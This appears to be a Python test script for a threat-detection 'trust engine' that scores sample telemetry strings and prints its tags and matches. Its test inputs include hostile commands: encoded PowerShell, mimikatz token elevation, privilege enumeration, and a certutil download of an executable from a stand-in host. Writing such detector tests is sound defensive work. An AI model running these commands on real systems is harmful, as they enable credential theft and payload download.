
from trust_engine_final import evaluate_trust_from_input

# Example telemetry inputs for testing
test_inputs = [
    "powershell -enc malware123",
    "cmd /c bitsadmin",
    "mimikatz token::elevate",
    "whoami /priv",
    "normal.exe",
    "certutil -urlcache -split -f http://example.com/mal.exe"
]

for i, telemetry in enumerate(test_inputs, 1):
    print(f"\n--- Test Case {i} ---")
    result = evaluate_trust_from_input(telemetry, mode="minimal_mode")
    print("Telemetry:", telemetry)
    print("Replay Triggered:", result.get("replay_triggered"))
    print("Trust Score:", result.get("trust_score"))
    print("Semantic Tags:", result.get("semantic_tags"))
    print("Fallback Profiles:", result.get("fallback_profiles_used"))
    print("Explanation:", result.get("explanation"))
    print("Matches:")
    for match in result.get("matches", []):
        print(f" - Pattern: {match.get('pattern')}, Tags: {match.get('semantic_tags')}, Replay Trigger: {match.get('replay_hook_trigger')}")
